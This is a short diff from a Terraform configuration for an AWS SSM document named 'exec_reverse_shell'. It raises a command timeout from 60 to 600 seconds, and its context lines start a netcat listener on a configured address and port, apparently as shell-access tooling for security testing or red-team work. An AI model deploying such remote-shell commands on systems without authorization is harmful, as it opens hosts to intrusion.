@@ -23,7 +23,7 @@ resource "aws_ssm_document" "exec_reverse_shell" {
                     ]
                 },
                 "inputs": {
-                    "timeoutSeconds": "60",
+                    "timeoutSeconds": "600",
                     "runCommand": [
                         "kill -9 $(cat ${local.pid_path}) 2>&1 > /dev/null",
                         "/usr/bin/nc -l ${local.listen_ip} ${local.listen_port} &",
